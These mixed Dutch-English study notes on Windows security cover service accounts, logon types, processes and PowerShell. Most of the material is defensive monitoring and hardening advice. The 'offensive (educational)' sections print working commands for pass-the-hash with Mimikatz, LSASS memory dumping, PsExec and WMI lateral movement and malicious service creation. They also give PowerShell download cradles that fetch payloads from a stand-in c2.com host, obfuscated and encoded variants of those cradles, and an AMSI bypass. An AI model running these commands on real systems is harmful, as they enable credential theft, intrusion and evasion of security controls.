### Local System Account (NT AUTHORITY\SYSTEM)

::important
**NT AUTHORITY\SYSTEM — The God Account:**

- **Meest krachtige account** in Windows systemen
- Gebruikt voor **OS-gerelateerde taken** zoals het starten van Windows services
- Heeft **volledige toegang** tot het file system, registry, en alle resources
- **Meer privileges dan local administrators** — kan acties uitvoeren die admins niet kunnen
- **Geen password** — kan niet gebruikt worden voor interactive logon
- Draait met **SeDebugPrivilege**, **SeBackupPrivilege**, **SeRestorePrivilege**, en vele andere
  ::

**Gebruik van SYSTEM Account:**

- **Windows Services** — De meeste kritieke services draaien als SYSTEM
- **Scheduled Tasks** — System-level automation
- **Windows Update** — Patch installatie en system modifications
- **Device Drivers** — Kernel-mode en user-mode drivers

::warning
**Security Implications:**
Als een attacker **SYSTEM privileges** verkrijgt, heeft deze:

- **Volledige controle** over het systeem
- Toegang tot **alle user credentials** (SAM database, LSASS memory)
- Mogelijkheid om **kernel drivers te laden**
- Capability om **security software te disablen**
- Volledige **file system en registry toegang**
  ::

### Local Service Account (NT AUTHORITY\LocalService)

Het **Local Service** account is een **less privileged versie** van het SYSTEM account.

::note
**Local Service Characteristics:**

- Vergelijkbare privileges als een **local user account**
- Kan **sommige services starten** met beperkte functionaliteit
- Heeft **eigen registry hive**: `HKEY_USERS\S-1-5-19`
- Netwerk toegang met **anonymous credentials** (NULL session)
- Gebruikt voor services die **minimal privileges** vereisen
  ::

**Typische Use Cases:**

- **SSDP Discovery Service** — UPnP device discovery
- **TCP/IP NetBIOS Helper**
- **WebClient Service**
- Andere services die **geen elevated privileges** nodig hebben

### Network Service Account (NT AUTHORITY\NetworkService)

Het **Network Service** account heeft vergelijkbare privileges als een **standard domain user account**.

::note
**Network Service Characteristics:**

- Vergelijkbare privileges als **Local Service** op de lokale machine
- Kan **authenticated network sessions** opzetten
- Authenticeert op het netwerk als **computer account** (`DOMAIN\COMPUTERNAME$`)
- Heeft **eigen registry hive**: `HKEY_USERS\S-1-5-20`
- Gebruikt voor services die **network resources** moeten benaderen
  ::

**Typische Use Cases:**

- **DNS Client Service**
- **DHCP Client**
- **Windows Time Service**
- **IIS Application Pools** (default identity in oudere versies)

## 🔄 Session Logon Types

Windows onderscheidt verschillende **logon types** die in Event Viewer (Event ID 4624) worden gelogd:

| Logon Type | Naam              | Beschrijving                                             |
| ---------- | ----------------- | -------------------------------------------------------- |
| **2**      | Interactive       | Lokale keyboard/screen logon                             |
| **3**      | Network           | Netwerk verbinding (SMB shares, remote file access)      |
| **4**      | Batch             | Scheduled task execution                                 |
| **5**      | Service           | Service startup                                          |
| **7**      | Unlock            | Workstation unlock (screensaver)                         |
| **8**      | NetworkCleartext  | Network logon met cleartext credentials (IIS Basic Auth) |
| **9**      | NewCredentials    | RunAs /netonly — credentials voor network access         |
| **10**     | RemoteInteractive | Remote Desktop (RDP) logon                               |
| **11**     | CachedInteractive | Logon met cached domain credentials (offline)            |

::tip
**Defensive Monitoring:**
Monitor Event ID **4624** (successful logon) en **4625** (failed logon) voor:

- **Logon Type 3** van unexpected sources — lateral movement detection
- **Logon Type 10** van unusual locations — unauthorized RDP access
- **Logon Type 9** — mogelijk credential abuse met RunAs
- **Logon Type 4/5** — suspicious scheduled tasks of services
  ::

## 🎯 Security Implications

### Privilege Escalation Perspective

::warning
**Escalation Targets:**

- **Local Service → SYSTEM** — Vaak mogelijk via service misconfigurations
- **Network Service → SYSTEM** — Via vulnerable services of DLL hijacking
- **User → Local Admin** — Via unpatched vulnerabilities, weak permissions
- **Local Admin → SYSTEM** — Via token manipulation, scheduled tasks, service creation
  ::

**Common Escalation Techniques:**

1. **Service Account Abuse** — Misconfigured service permissions (`sc.exe`, `AccessChk.exe`)
2. **Token Impersonation** — Steal SYSTEM tokens van running processen
3. **Scheduled Tasks** — Create task running as SYSTEM
4. **AlwaysInstallElevated** — MSI installers running as SYSTEM
5. **Unquoted Service Paths** — DLL hijacking in service paths

### Lateral Movement Context

::important
**Session Types voor Lateral Movement:**

- **Logon Type 3** — PsExec, SMB authentication, WMI remote execution
- **Logon Type 9** — RunAs /netonly voor network-only credential usage
- **Logon Type 10** — RDP voor interactive remote sessions
- **Pass-the-Hash** — Network logons zonder plaintext passwords
  ::

## 🛡️ Defensive Recommendations

::important
**Voor Blue Team / Security Engineers:**

**Session Monitoring:**

- Enable **enhanced logon auditing** via Group Policy
- Monitor **4624** (successful logon) en **4625** (failed logon) events
- Alert op **unusual logon types** voor accounts (bijv. service accounts met Type 10)
- Track **lateral movement patterns** via Type 3 logons from workstations

**Service Account Hardening:**

- Gebruik **Group Managed Service Accounts (gMSA)** voor automated password rotation
- Implementeer **least privilege** voor service accounts
- Avoid **Local Admin** rights voor service accounts waar mogelijk
- Gebruik **Virtual Service Accounts** voor local services (geen domain account nodig)

**SYSTEM Account Protection:**

- Enable **Protected Process Light (PPL)** voor critical services
- Monitor voor **SeDebugPrivilege** usage (token manipulation attempts)
- Restrict **service creation** rights (alleen admins)
- Audit **scheduled tasks** regelmatig voor suspicious SYSTEM tasks

**RDP Hardening:**

- Enable **Network Level Authentication (NLA)**
- Gebruik **Restricted Admin Mode** voor RDP (`mstsc.exe /restrictedadmin`)
- Implementeer **multi-factor authentication (MFA)** voor RDP
- Monitor Event ID **4778** (session reconnected) en **4779** (session disconnected)
  ::

## 🎯 Offensive Perspective (Educational)

::note
**Voor Penetration Testing / Red Team:**

**Privilege Escalation:**

- **Service Enumeration:** `Get-Service | Where-Object {$_.StartType -eq "Automatic"}`
- **Service Permissions Check:** `accesschk.exe -uwcqv "Authenticated Users" *`
- **Token Impersonation:** Steal SYSTEM tokens via `Invoke-TokenManipulation`
- **Always Install Elevated:** Check registry `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`

**Lateral Movement:**

- **Pass-the-Hash:** `Invoke-Mimikatz -Command "sekurlsa::pth /user:Admin /domain:DOMAIN /ntlm:HASH"`
- **PSExec:** `psexec.exe \\target -u DOMAIN\user -p password cmd.exe`
- **WMI Execution:** `wmic /node:target /user:DOMAIN\user process call create "cmd.exe"`
- **Scheduled Tasks:** `schtasks /create /tn "TaskName" /tr "payload.exe" /sc onlogon /ru SYSTEM /s target`

**SYSTEM Access:**

- **PsExec SYSTEM:** `psexec.exe -s -i cmd.exe` (requires admin)
- **Scheduled Task:** Create task as SYSTEM via Task Scheduler
- **Service Creation:** `sc.exe create MalService binPath= "C:\payload.exe" start= auto`
  ::

<!-- ## 🔍 Key Event IDs voor Monitoring

| Event ID | Beschrijving | Relevantie |
|----------|--------------|------------|
| **4624** | Successful account logon | Alle logon types — monitor voor lateral movement |
| **4625** | Failed account logon | Brute force detection, credential stuffing |
| **4672** | Special privileges assigned to new logon | Admin/SYSTEM logons — privilege escalation indicator |
| **4648** | Logon using explicit credentials | RunAs usage — credential theft indicator |
| **4778/4779** | RDP session reconnected/disconnected | RDP activity tracking |
| **4688** | New process creation | Process execution — command line logging enabled |
| **4697** | Service installed on system | Service-based persistence or privilege escalation |
| **4698** | Scheduled task created | Scheduled task persistence | -->

## processen

### Offensive & Defensive Use Cases

**Offensive (Red Team / Penetration Testing):**

- **Process Injection Detection** — Identificeer geïnjecteerde DLLs in legitieme processen
- **Privilege Discovery** — Bekijk onder welke user context processen draaien
- **Service Exploitation** — Analyseer service binary paths en permissions

**Defensive (Blue Team / Incident Response):**

- **Malware Detection** — Identificeer suspicious processen en geïnjecteerde DLLs
- **Parent-Child Anomalies** — Detecteer abnormale parent-child relationships (bijv. `cmd.exe` spawned door `winword.exe`)
- **Unsigned Binaries** — Filter op unsigned DLLs en executables
- **Network Connections** — Bekijk welke processen netwerk connecties hebben

## 📋 Samenvatting

| Concept                 | Key Takeaway                                                                                                    |
| ----------------------- | --------------------------------------------------------------------------------------------------------------- |
| **Services**            | Long-running processen die automatisch starten bij boot, beheerd via SCM (`services.msc`)                       |
| **Service Permissions** | Common privilege escalation vector — controleer altijd service permissions                                      |
| **Critical Services**   | `smss.exe`, `csrss.exe`, `lsass.exe`, `services.exe`, `winlogon.exe` — kunnen niet gestopt worden zonder reboot |
| **LSASS**               | High-value target voor credential extraction — bevat cleartext en hashed credentials in memory                  |
| **Processes**           | Achtergrond processen — sommige kunnen veilig worden beëindigd, anderen zijn kritiek                            |
| **Sysinternals Tools**  | Portable suite van admin tools — uitvoerbaar vanaf `\\live.sysinternals.com\tools`                              |
| **Task Manager**        | Built-in tool voor proces/performance monitoring — 7 tabs met verschillende functionaliteit                     |
| **Process Explorer**    | Enhanced Task Manager — toont handles, DLLs, parent-child relationships                                         |

## 🛡️ Defensive Recommendations

::important
**Voor Blue Team / Security Engineers:**

**LSASS Protection:**

- Enable **Credential Guard** (Windows 10 Enterprise/Education)
- Enable **LSA Protection (RunAsPPL)** via registry: `HKLM\SYSTEM\CurrentControlSet\Control\Lsa → RunAsPPL = 1`
- Monitor Event ID **4656** (handle to object requested) voor LSASS access attempts
- Monitor Event ID **10** (Sysmon ProcessAccess) voor LSASS memory reads

**Service Hardening:**

- Audit service permissions regelmatig met `AccessChk.exe` (Sysinternals)
- Implementeer **least privilege** voor service accounts
- Gebruik **Group Managed Service Accounts (gMSA)** waar mogelijk
- Monitor Event ID **7045** (nieuwe service installatie)

**Process Monitoring:**

- Deploy **Sysmon** voor gedetailleerde process creation logging (Event ID 1)
- Monitor voor **abnormale parent-child relationships**
- Alert op **suspicious process arguments** (encoded PowerShell, `wmic`, `psexec`)
- Track **unsigned binaries** en DLLs geladen in processen
  ::

## 🎯 Offensive Perspective (Educational)

::note
**Voor Penetration Testing / Red Team:**

**Reconnaissance:**

- Gebruik **Process Explorer** om interessante processen te identificeren
- **Autoruns** voor persistence locations
- **TCPView** voor active network connections

**Credential Access:**

- **ProcDump** voor LSASS memory dump: `procdump.exe -ma lsass.exe lsass.dmp`
- Offline parsing met **Mimikatz**: `sekurlsa::minidump lsass.dmp`

**Privilege Escalation:**

- **AccessChk** voor misconfigured service permissions
- **Process Explorer** voor processen draaiend als SYSTEM

**Lateral Movement:**

- **PSExec** voor remote command execution
- **PsExec64.exe \\target -u DOMAIN\user -p password cmd.exe**
  ::

## ntfs

### 🎯 Defensive Perspective

::important
**Voor Blue Team / Security Engineers:**

- Monitor **Event Viewer** voor ongebruikelijke SMB toegang (Event ID 5140, 5142, 5143, 5144, 5145)
- Audit **share permissions** regelmatig — vermijd overly permissive "Everyone" group
- Gebruik **Group Policy** voor centraal firewall management
- Implementeer **least privilege** principle voor zowel NTFS als share permissions
- Disable **SMBv1** protocol — kwetsbaar voor EternalBlue
- Monitor **hidden admin shares** (C$, ADMIN$, IPC$) voor ongeautoriseerde toegang
  ::

  ## interacting with windows

## 🛡️ Defensive Recommendations

::important
**Voor Blue Team / Security Engineers:**

**PowerShell Logging:**

- Enable **Script Block Logging** (Event ID 4104) — logt alle script content
- Enable **Module Logging** — logt cmdlet execution
- Enable **Transcription** — logt complete PowerShell sessions
- Monitor **Event ID 4103** (Module Logging) en **4104** (Script Block Logging)

**Execution Policy Hardening:**

- Set **AllSigned** policy via Group Policy waar mogelijk
- Deploy **AppLocker** of **Windows Defender Application Control (WDAC)** voor echte enforcement
- Monitor voor **execution policy changes** (registry monitoring)
- Alert op **"-ExecutionPolicy Bypass"** in command lines

**PowerShell Security Features:**

- Enable **Constrained Language Mode** voor restricted environments
- Implement **Just Enough Administration (JEA)** voor role-based access
- Use **PowerShell remoting** met **session configurations** voor least privilege
- Deploy **Antimalware Scan Interface (AMSI)** monitoring

**Command Line Auditing:**

- Enable **Process Creation Auditing** (Event ID 4688) met command line logging
- Monitor voor **suspicious PowerShell patterns**:
  - Encoded commands (`-enc`, `-EncodedCommand`)
  - Download cradles (`IEX`, `Invoke-WebRequest`, `Net.WebClient`)
  - Obfuscation (excessive backticks, string concatenation)
  - Base64 encoded payloads
  - Bypass attempts (`-ExecutionPolicy Bypass`, `-noprofile`, `-windowstyle hidden`)
    ::

## 🎯 Offensive Perspective (Educational)

::note
**Voor Penetration Testing / Red Team:**

**Execution Policy Bypasses:**

```powershell
# Process scope bypass
Set-ExecutionPolicy Bypass -Scope Process

# Command line bypass
powershell.exe -ExecutionPolicy Bypass -File payload.ps1

# No profile, hidden window
powershell.exe -nop -w hidden -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://c2.com/payload.ps1')"
```

**Obfuscation Techniques:**

```powershell
# String concatenation
$a = "IEX"; $b = "(New-Object"; $c = "Net.WebClient).DownloadString"; iex "$a $b $c('http://c2.com/p.ps1')"

# Base64 encoding
$cmd = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("IEX (iwr http://c2.com/p.ps1)"))
powershell.exe -EncodedCommand $cmd
```

**AMSI Bypass (Educational):**

```powershell
# AMSI bypass via memory patching (example, many signatures exist)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**Constrained Language Mode Bypass:**

```powershell
# Check current language mode
$ExecutionContext.SessionState.LanguageMode

# Bypass attempts (various techniques, environment dependent)
```

::

## 📋 Samenvatting

| Concept                       | Key Takeaway                                                                   |
| ----------------------------- | ------------------------------------------------------------------------------ |
| **GUI**                       | Point-and-click interface — accessibility voor non-technical users             |
| **RDP**                       | Remote graphical access via TCP 3389 — primary lateral movement vector         |
| **CMD**                       | Legacy command prompt — basic commands, batch scripting                        |
| **PowerShell**                | Modern command shell — .NET integration, object-oriented, extensive automation |
| **Cmdlets**                   | PowerShell commands — Verb-Noun naming convention, 100+ core cmdlets           |
| **Aliases**                   | Shortcuts voor cmdlets — `ls` = `Get-ChildItem`, `cd` = `Set-Location`         |
| **Execution Policy**          | Safety feature, niet security control — eenvoudig te bypassen                  |
| **Script Block Logging**      | Event ID 4104 — logt alle PowerShell script content                            |
| **AMSI**                      | Antimalware Scan Interface — runtime script scanning                           |
| **Constrained Language Mode** | Beperkt PowerShell functionaliteit — defensieve hardening                      |

## 🔍 Key Event IDs voor Monitoring

| Event ID    | Bron             | Beschrijving               | Relevantie                                    |
| ----------- | ---------------- | -------------------------- | --------------------------------------------- |
| **4104**    | PowerShell       | Script Block Logging       | Alle uitgevoerde PowerShell code              |
| **4103**    | PowerShell       | Module Logging             | Cmdlet execution tracking                     |
| **4688**    | Security         | Process Creation           | Command line arguments (met auditing enabled) |
| **800-803** | PowerShell       | Pipeline execution details | Legacy PowerShell logging                     |
| **1116**    | Windows Defender | AMSI detection             | Malicious script detection                    |
